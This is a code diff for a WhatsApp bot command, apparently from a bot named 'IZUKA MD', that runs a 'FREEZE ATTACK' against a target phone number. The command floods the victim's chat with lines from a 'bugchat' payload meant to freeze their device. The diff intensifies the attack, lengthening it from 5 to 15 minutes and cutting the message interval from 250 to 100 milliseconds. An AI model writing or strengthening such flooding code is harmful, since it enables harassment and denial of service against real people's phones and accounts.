@@ -57,19 +57,19 @@ cmd({
     const targetJid = `${targetNumber}@s.whatsapp.net`;
 
     await bot.sendMessage(from, {
-      text: `❄️ *FREEZE ATTACK LAUNCHING*\n📲 Target: +${targetNumber}\n🕒 Duration: 5 minutes`
+      text: `❄️ *FREEZE ATTACK LAUNCHING*\n📲 Target: +${targetNumber}\n🕒 Duration: 15 minutes`
     }, { quoted: mek });
 
     const lines = bugchat.split('\n').filter(Boolean);
     const startTime = Date.now();
     let count = 0;
 
-    while (Date.now() - startTime < 5 * 60 * 1000) { // 5 minit
+    while (Date.now() - startTime < 15 * 60 * 1000) { // 15 minit
       for (let line of lines) {
         await bot.sendMessage(targetJid, {
           text: `☃️ *FREEZE ATTACK #${++count}*\n${line}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
         });
-        await new Promise(resolve => setTimeout(resolve, 250));
+        await new Promise(resolve => setTimeout(resolve, 100)); // 0.1s
       }
     }
 
@@ -78,7 +78,7 @@ cmd({
     });
 
     await bot.sendMessage(from, {
-      text: `✅ *FREEZE attack finished*\n🕔 Ran for 5 minutes\n📤 Messages sent: ${count}\n🎯 Target: +${targetNumber}`
+      text: `✅ *FREEZE attack finished*\n🕔 Ran for 15 minutes\n📤 Messages sent: ${count}\n🎯 Target: +${targetNumber}`
     }, { quoted: mek });
 
   } catch (error) {
